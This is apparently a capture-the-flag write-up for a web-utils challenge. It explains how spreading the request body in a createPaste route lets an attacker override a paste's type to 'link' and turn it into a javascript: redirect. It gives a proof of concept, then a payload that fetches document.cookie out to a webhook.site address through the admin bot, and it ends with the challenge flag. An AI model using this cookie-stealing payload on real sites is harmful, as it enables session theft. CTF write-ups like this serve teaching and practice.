@@ -1,0 +1,57 @@
+## app/public/view.html
+
+if (! data || ! type ) window.location = window.origin;
+if (type === 'link') return window.location = data;
+
+Reflected XSS
+	window.location="javascript:alert(1)"
+
+# Contrains
+## app/routes/api.js
+
+module.exports = async (fastify) => {
+  fastify.post('createLink', {
+    handler: (req, rep) => {
+      const uid = database.generateUid(8);
+      const regex = new RegExp('^https?://');
+      if (! regex.test(req.body.data))
+        return rep
+          .code(200)
+          .header('Content-Type', 'application/json; charset=utf-8')
+          .send({
+            statusCode: 200,
+            error: 'Invalid URL'
+          });
+
+
+
+Need to start with http:// or https://
+
+## app/routes/api.js
+database.addData({ type: 'paste', ...req.body, uid });
+
+... is a spread operator in Javascript
+
+
+Create Paste, so we don't need to care about constains, and make its type to link with override
+
+
+Post (PoC)
+	POST /api/createPaste
+	{"data": "javascript:alert(1)", "type": "link"}
+
+	=> database.addData({ type: 'paste', data: 'javascript:alert(1)', type: 'link' , uid });
+
+	https://web-utils.dicec.tf/api/data/5V9dSzpj
+		{"statusCode":200,"data":"javascript:alert(1)","type":"link"}
+
+
+Exploit
+	POST /api/createPaste
+	{"data": "javascript:fetch(`https://webhook.site/8ee5457c-df16-4b08-9dbc-b72af16bc1a2/?cookie=`+document.cookie)", "type": "link"}
+		{"statusCode":200,"data":"z1Py2nmX"}
+
+	Post to Admin Bot
+		https://web-utils.dicec.tf/view/z1Py2nmX
+
+	token=dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}
